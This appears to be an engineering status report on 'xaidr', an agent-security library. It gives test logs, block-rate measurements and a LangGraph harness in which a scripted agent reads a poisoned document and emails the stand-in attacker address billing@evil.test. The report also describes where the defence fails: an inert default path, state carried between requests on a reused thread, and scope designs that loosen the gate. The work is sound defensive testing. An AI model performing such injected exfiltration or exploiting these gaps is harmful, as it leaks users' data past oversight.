tests/test_value_origin_drop.py:55: AssertionError: a dropped destination write read 'ledger_saturated': the system does not know what it just saw, and treated it as benign
tests/test_value_origin_drop.py:88: AssertionError: ('allowed', 'ledger_saturated', None, [])
```
Sabotage, one per change (SD5 is the discriminating one: key-n-gram drops must stay non-blocking):
```
== SD1 a dropped destination write is not marked: 3 failed, 2 passed, 32 deselected in 1.85s
   red: test_a_dropped_destination_write_blocks_as_unexaminable
   red: test_a_dropped_write_block_carries_the_unexaminable_names
   red: test_a_saturating_result_does_not_launder_its_poison
   msg: ('allowed', 'ledger_saturated', None, [])
   msg: a dropped destination write read 'ledger_saturated': the system does not know what it just saw, and treated it as benign
== SD2 write_dropped does not block: 3 failed, 2 passed, 32 deselected in 1.85s
   red: test_a_dropped_destination_write_blocks_as_unexaminable
   red: test_a_dropped_write_block_carries_the_unexaminable_names
   red: test_a_saturating_result_does_not_launder_its_poison
   msg: ('allowed', 'write_dropped', None, [])
   msg: a dropped write must block (owner, ruling 4)
== SD3 the examined pass unbudgeted again: 1 failed, 4 passed, 32 deselected in 7.39s
   red: test_a_results_examined_pass_is_bounded_by_work_and_says_so
   msg: a result's examined pass scanned 4,194,278 chars of address-dense text: the 64 x 64 KiB examined bound alone lets an attacker choose a ~6 s scan
== SD4 a dropped write named as an untrusted destination: 1 failed, 4 passed, 32 deselected in 1.85s
   red: test_a_dropped_write_block_carries_the_unexaminable_names
   msg: ('blocked', 'write_dropped', 'untrusted_destination', ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'])
== SD5 key-n-gram drops also mark a dropped destination write: 1 failed, 4 passed, 32 deselected in 1.85s
   red: test_a_dropped_key_ngram_write_stays_ledger_saturated_and_does_not_block
   msg: write_dropped
== restored: True
```
**Reviews of the uncommitted change (fresh context).**
- **silent-failure-hunter, CRITICAL, and the milestone-reviewer, HIGH, both confirmed:** a write lost to a FAULT set no flag, laundering more cheaply than a full ledger. **Fixed:** every FAULT return from the two recorders now marks the lost write. This also covers a mis-split span list and a non-string input. **That extension is mine, for the owner to confirm.** Red, green, then sabotage:
```
tests/test_value_origin_drop.py:126: AssertionError: a write lost to a fault read 'unresolved': the system does not know what it just saw, and treated it as benign
tests/test_value_origin_drop.py:139: AssertionError: unresolved
2 failed, 4 deselected in 0.02s
E   AssertionError: a write lost to a fault read 'unresolved': the system does not know what it just saw, and treated it as benign
E   AssertionError: unresolved
--- after the fix: 6 passed, 2 xfailed in 0.98s
--- sabotage (the lost write not marked):
tests/test_value_origin_drop.py:126: AssertionError: a write lost to a fault read 'unresolved': the system does not know what it just saw, and treated it as benign
tests/test_value_origin_drop.py:139: AssertionError: unresolved
2 failed, 4 deselected in 0.01s
E   AssertionError: a write lost to a fault read 'unresolved': the system does not know what it just saw, and treated it as benign
E   AssertionError: unresolved
```
- **Pins changed by it** (each noted at its site): M6 `not_scannable_ends_previous` (`write_dropped`; a fresh ledger is still bound) and conformance S21 (expected.jsonl regenerated at --rev 01450c7). The atoms warning test was renamed: the warning now says a dropped write blocks.
- **milestone-reviewer, other findings:**
  - the false-positive check used a fresh ledger per document, so it could not reach a per-FLOW cap. Re-measured as one flow: every benign document (540) as tool results in ONE flow: 1,391 distinct destination entries (13.9% of the 10,000 cap), dropped=False;
  - the examined budget's "263 ms worst" was the cheapest shape. Distinct IDN URLs cost ~1.0–1.3 s, so the budget was halved:
```
  64 x 64 KiB distinct URLs https://h{i}.co/p                        340 ms
  64 x 64 KiB distinct IDN URLs https://bücher{i}.de/p               563 ms
  128 x 64 KiB distinct IDN URLs (examined + past the bound)         826 ms
  64 x 64 KiB address-dense 'x.co '                                  176 ms
```
  - stale docs and the runtime warning were corrected;
  - the item 1 note's facts were corrected (above).

**False-positive measurement (per document):**
```
R1 pin updated
xaidr    : /Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/xaidr/__init__.py
version  : 1.19.0
measuring: THE WORKING TREE at /Users/anirudhkotaru/worktrees/opena2a/value-origin-seams — not an installed wheel. Set XAIDR_FROM_INSTALL=1 (neutral cwd, python -I) to measure a published artifact instead.

benign documents measured: 768 (456-row corpus, benign_a2a, benign_longform, adversarial benign sets)
  that trip write_dropped as a TOOL RESULT: 0 []
  that trip write_dropped as an INPUT:      0 []
  most distinct addresses in one benign document (cap 10,000): [(1428, 'benign_longform:LF-kubectl_dump-900k'), (635, 'benign_longform:LF-kubectl_dump-400k'), (238, 'benign_longform:LF-kubectl_dump-150k'), (143, 'benign_longform:LF-kubectl_dump-90k'), (11, 'benign_longform:LF-thread_dump-90k')]
the EXAMINED pass under EXAMINED_WORK_BUDGET (2,000,000 units), one result:
  64 leaves x 64 KiB, address-dense ('x.co ')                    263 ms
  64 leaves x 64 KiB, rejected non-ASCII ('é.é ')                143 ms
  64 leaves x 64 KiB, ordinary prose                             124 ms
```
**Block rate after (no benign call reads `write_dropped`):**
```
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-flow-I                     calls=   64  would block=   0  rate= 0.00% | benign_a2a: 0/64 [('no_destination', 58), ('principal_undeclared_span', 4), ('unresolved', 2)]
  P-flow-R                     calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
  P-flow-I                     calls=   24  would block=   7  rate=29.17% | benign_longform: 7/24 [('argument_bound', 11), ('extraction_incomplete', 6), ('untrusted_source', 7)]
  P-flow-R                     calls=   24  would block=   8  rate=33.33% | benign_longform: 8/24 [('argument_bound', 10), ('extraction_incomplete', 6), ('untrusted_source', 8)]
  A-calls                      calls=  470  would block=  98  rate=20.85% [('no_destination', 368), ('unresolved', 4), ('untrusted_source', 98)]
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-steps                      calls=   36  would block=   0  rate= 0.00% [('no_destination', 28), ('unresolved', 8)]
```
**Green before the push:**
- in-process (83 files: every suite that emits telemetry or scans tool calls, plus the new tests, url_parse users and conformance): **7845 passed, 16 skipped, 13 xfailed, 1 warning in 229.08s (0:03:49)**;
- real frameworks (CI pins): **26 passed, 53 skipped in 0.67s**;
- from the wheel (every outside test): **86 passed in 54.39s**.

### Ruling 3
The Splunk TA's "Targets 0.2.0" is LEFT, and recorded in the backlog (docs/value-origin-rulings.md).

## M10: STOPPED at the LangGraph finding, before building around it (owner, 2026-10-07)

**Measured from the BUILT WHEEL** in a fresh venv (`tests/outside/harness.py`), with CI's pins: langchain-core 1.6.1, langchain 1.4.1, langgraph 1.2.12, langgraph-prebuilt 1.1.0. The driver is `tests/outside/drivers/langchain_poisoned_read.py`, run with `python -I`; it refuses unless xaidr comes from site-packages. It uses REAL `create_agent` + `ToolNode`, a scripted chat model (read, then send, then done), and `xaidr.protect(value_origin=..., enforcement_mode=..., reporter=cap)`, flushed with `unprotect(close_sensor=True)` before `cap` is read. A fresh-context review re-ran it from its own freshly built wheel and got the same verdict in every case.
```
xaidr: m10/venv/lib/python3.12/site-packages/xaidr/__init__.py {'langchain_core': '1.6.1', 'langgraph': '?'}
A-enforce-block        executed=['read_doc'] send=[('blocked', 'untrusted_source', ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'])] toolmsg=["[BLOCKED] Tool 'send_email' bl"] dirs=['input', 'output', 'tool_call', 'tool_result']
A-enforce-monitor      executed=['read_doc', 'send_email'] send=[('blocked', 'untrusted_source', ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
A-off                  executed=['read_doc', 'send_email'] send=[('allowed', None, [])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
A-record               executed=['read_doc', 'send_email'] send=[('allowed', 'untrusted_source', [])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
C-no-flow              executed=['read_doc', 'send_email'] send=[('allowed', 'no_flow', [])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
D-async                ERROR NotImplementedError: Asynchronous implementation of awrap_tool_call is not available. You are likely encountering this error because you defined only the sync version (wrap_tool_call) and invoked your
D-async-vo-off         ERROR NotImplementedError: Asynchronous implementation of awrap_tool_call is not available. You are likely encountering this error because you defined only the sync version (wrap_tool_call) and invoked your
R-reuse-no-flow:A      executed=['send_email'] send=[('allowed', 'no_flow', [])] toolmsg=['sent to alice@corp.example'] dirs=['input', 'output', 'tool_call', 'tool_result']
R-reuse-no-flow:B      executed=['send_email'] send=[('allowed', 'no_flow', [])] toolmsg=['sent to alice@corp.example'] dirs=['input', 'output', 'tool_call', 'tool_result']
R-reuse-open-flow:A    executed=['send_email'] send=[('allowed', 'principal_undeclared_span', [])] toolmsg=['sent to alice@corp.example'] dirs=['input', 'output', 'tool_call', 'tool_result']
R-reuse-open-flow:B    executed=['send_email'] send=[('allowed', 'principal_undeclared_span', [])] toolmsg=['sent to alice@corp.example'] dirs=['input', 'output', 'tool_call', 'tool_result']
```
(`'langgraph': '?'` is the driver failing to read the version. Both venvs have 1.2.12, checked by the reviewer with `importlib.metadata`.)

### What it settles
1. **HEADLINE: value origin is INERT on the default LangGraph path.**
   - Without `begin_flow()` called OUTSIDE the graph, the send reads `no_flow`, and ENFORCE lets the poisoned send through (C-no-flow).
   - The review traced why, inside the graph. The input IS scanned and clean. Each `before_model` binds a fresh implicit ledger inside its own node context (three binds: F6). Neither the model node nor the tools node ever sees one. `read_doc` also reads no ledger.
   - This is F5, measured.
   - **With `begin_flow()` outside the graph it works, under SYNC `invoke`.** The send is not executed, the model receives `[BLOCKED] Tool 'send_email' ...`, and the event carries `ORIGIN_UNTRUSTED_DESTINATION` + `intent.value_origin_untrusted`.
2. **Async `create_agent` hosts CRASH under xaidr's LangChain middleware, value origin OFF included:** `NotImplementedError: Asynchronous implementation of awrap_tool_call is not available`.
   - **Cause:** `xaidr/integrations/langchain.py:225` defines `wrap_tool_call` and no `awrap_tool_call`. `create_agent` keeps a middleware that overrides only the sync hook, then calls the base class's async one, which raises. Without xaidr, the same agent completes.
   - **Reach:** it fires on the FIRST tool call, so nothing runs. It hits `protect()` and direct `delphi_middleware(...)` users alike.
   - **Not new:** it is pre-existing on `origin/main`.
   - **Untested, and contradicted by the docs:** no test covers it (the `ainvoke` tests use a hand-written `StateGraph`), and the module docstring (`langchain.py:21-23`) says the opposite.
   - **NOT a value-origin defect; wider than A2.** §4's D-async case cannot pass until it is fixed.
3. **The reused-thread carry reproduces through a real framework, in ONE of the two shapes.**
   - **Open flow (reproduces):** user A's request calls `begin_flow()` and never `clear_flow()`. User B's request runs next on the SAME pool thread, with no flow of its own and the prompt "Send the minutes to the team.". B's send to alice reads **`principal_undeclared_span`**: B reuses A's explicit ledger (the same object on the same worker, with the flow still active). A control where B opens its own flow reads `unresolved`.
   - **Flow-less (does NOT reproduce through LangGraph):** both read `no_flow`, because that path is inert (finding 1).
   - This upgrades `test_a_flow_left_open_by_user_a_is_not_user_bs_ledger` from a unit-level shape to a real-host one. It does not upgrade the other xfail.
4. **A-enforce-monitor:** the send is executed, as §4 requires. The EVENT carries `action=blocked` with `enforcementMode=monitor`: the true verdict, emitted before `_apply_mode` (`sensor.py:2574-2587`; M8b; every gate does this).
   - §4's row ("Event `action=flagged`") conflicts with that design; M8's own text ("monitor gives flagged") is true of the RETURNED verdict.
   - **This needs a ruling.** Recommendation: §4 is the outlier.
5. **A-record vs A-off:** both are `('allowed', 0.0, None, [])`. A-record's `valueOrigin` is `untrusted_source`; A-off's send event carries none.

### Gaps against §4 in this measurement (named, not hidden)
- No B-designated-twin case yet.
- All cases ran in ONE process; §4 says each in its own. The reviewer re-ran C-no-flow alone, with the same result.
- A-off's "no valueOrigin anywhere" is checked on the send event only.
- The driver records only `send_email` events.

### A driver defect, mine, found and fixed during the measurement
The first run reported NO events for A-off and for both reuse cases:
```
xaidr: m10/venv/lib/python3.12/site-packages/xaidr/__init__.py {'langchain_core': '1.6.1', 'langgraph': '?'}
A-enforce-block        executed=['read_doc'] send=[('blocked', 'untrusted_source', ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'])] toolmsg=["[BLOCKED] Tool 'send_email' bl"] dirs=['input', 'output', 'tool_call', 'tool_result']
A-enforce-monitor      executed=['read_doc', 'send_email'] send=[('blocked', 'untrusted_source', ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
A-off                  executed=['read_doc', 'send_email'] send=[] toolmsg=['sent to billing@evil.test'] dirs=[]
A-record               executed=['read_doc', 'send_email'] send=[('allowed', 'untrusted_source', [])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
C-no-flow              executed=['read_doc', 'send_email'] send=[('allowed', 'no_flow', [])] toolmsg=['sent to billing@evil.test'] dirs=['input', 'output', 'tool_call', 'tool_result']
D-async                ERROR NotImplementedError: Asynchronous implementation of awrap_tool_call is not available. You are likely encountering this error because you defined only the sync version (wrap_tool_call) and invoked your agent in an asynchronous cont
D-async-vo-off         ERROR NotImplementedError: Asynchronous implementation of awrap_tool_call is not available. You are likely encountering this error because you defined only the sync version (wrap_tool_call) and invoked your agent in an asynchronous cont
R-reuse-no-flow:A      executed=['send_email'] send=[] toolmsg=['sent to alice@corp.example'] dirs=[]
R-reuse-no-flow:B      executed=['send_email'] send=[] toolmsg=['sent to alice@corp.example'] dirs=[]
R-reuse-open-flow:A    executed=['send_email'] send=[] toolmsg=['sent to alice@corp.example'] dirs=[]
R-reuse-open-flow:B    executed=['send_email'] send=[] toolmsg=['sent to alice@corp.example'] dirs=[]
```
- **Cause 1:** A-off called `protect()` before `langchain.agents` was imported, and `protect()` patches only frameworks already imported.
- **Cause 2:** the async case raised before `unprotect()`, so its `protect()` stayed installed and every later `protect()` was a no-op that reported to the wrong sensor.
- **Fix:** the driver now imports the frameworks first and unprotects in a `finally`.

### Not started, because the finding changes the scope (owner: "report it before building around it")
The committed acceptance test and its CI step; Q12 (LangChain string-input binding); the MCP stub-ClientSession end-to-end test; a real streaming `httpx.Response`; the C-11 P-seam pass through the LangChain/MCP hooks; S23/S24 through `protect()` from the wheel. Each stays as M7 deferred it, pending the owner's ruling on findings 1–4.

## A2 build (handoff 2026-10-08): STOPPED in P1, after three designs of xaidr.flow() failed their counter-case

Spec: docs/value-origin-a2-build-spec.md (`46cc8c4`, corrected in place since).

### Landed

| step | SHA | status |
|---|---|---|
| STEP 0 | `8ce8dc4`, `5a5f575`, `bde6c2f`, `832e642` | done; CI green on `832e642`, PR MERGEABLE |
| STEP 1 | spec §2 | done; the conditional stop did not fire |
| STEP 2 | spec §5 | done; audited; coverage 100% -> 0% under S-2 |
| STEP 3 | `46cc8c4` | done |
| P1 | first design `3a6c820`; second `325f12c`; third `93d60a1` | STOPPED (below) |
| P2 | `9d8932c` | built and verified; NOT yet fresh-context reviewed |

### P1: what holds, and what three reviews broke

**What holds in every design**, measured in process and from the wheel:

- a request scope that raises leaves nothing for the next request on the
  thread;
- the decorated form is per-call safe on a thread pool;
- `async def` and generator functions are refused as decorator targets;
- the D3 limitation is stated in docs/api.md, README.md and the no_flow
  warning.

**What broke.** P1's counter-case is: (1) a tier-gate verdict looser than with
no `xaidr.flow()` at all, or (2) a later request starting in an earlier
request's flow or ledger.

- **First design (`3a6c820`, tokens):** a stray or second exit cleared an
  unrelated inbound request (1). Out-of-order exits brought a closed scope back
  (2).
- **Second design (`325f12c`, value snapshots and a splice):**
  - a request scope exiting with a generator's scope still open did not end
    the request (2);
  - a nested `flow(principal=)` replaced the chain, and the tier gate opened
    4-to-1 (1).
- **Third design (`93d60a1`, join and close-what-you-opened).** Reproduced in
  this session, not only relayed:
  - a fresh scope over an untiered upstream hop (an unconfigured sensor's
    default) drops it. With no scope: `approval_required`, ceiling 4. Through
    `@xaidr.flow(principal=...)`: `allowed`, ceiling 1 (1).
  - a worker task created inside request A's scope inherits A's open entry;
    job B's own scope JOINS it, and B reads `principal_undeclared_span` (2).
  - The reviewers also measured (2) when an inner `clear_flow()` disarms the
    enclosing scope, and both (1) and (2) when the generator refusal is
    bypassed through a `@contextmanager` or class wrapper.

### Why a fourth design was not attempted

There is no request-boundary signal except the scope the host opens. So when
a scope finds state already there, it cannot tell "my request's" from "an
earlier request's left over" from "inherited by a worker". Every rule trades
one counter-case for the other:

- **Join existing state:** carries into workers and jobs (2).
- **Replace it:** drops delegation evidence (1).
- **Keep only "evidence":** is order-dependent, and inherits a leaked request's
  chain.
- **Restore on exit:** drops delegation recorded inside the scope, or lands in
  a later request when the exit runs late.
- **Generator detection:** bypassable by indirection, and it has false
  positives (yield fixtures, batch generators).

These are rulings for the owner (spec §7 Q-G), not implementation choices.

### Also found, and reported rather than fixed (pre-existing; outside A2)

These are held for the owner's disclosure call, so no detail is written here.

- One shipped docstring describes how to trigger a defect in released
  versions, and gate #40 cannot see it.
- A2-added docstrings quote inputs that the released metadata detection
  allows.
- Two other published defects were measured, and reported to the owner.
- The ENFORCE startup warning names four bound states as blocking; none of them
  blocks.
- One unexplained test failure occurred in 1 of 16 combined P1 runs. It was
  not reproduced in 25 more runs, and its name was not captured.
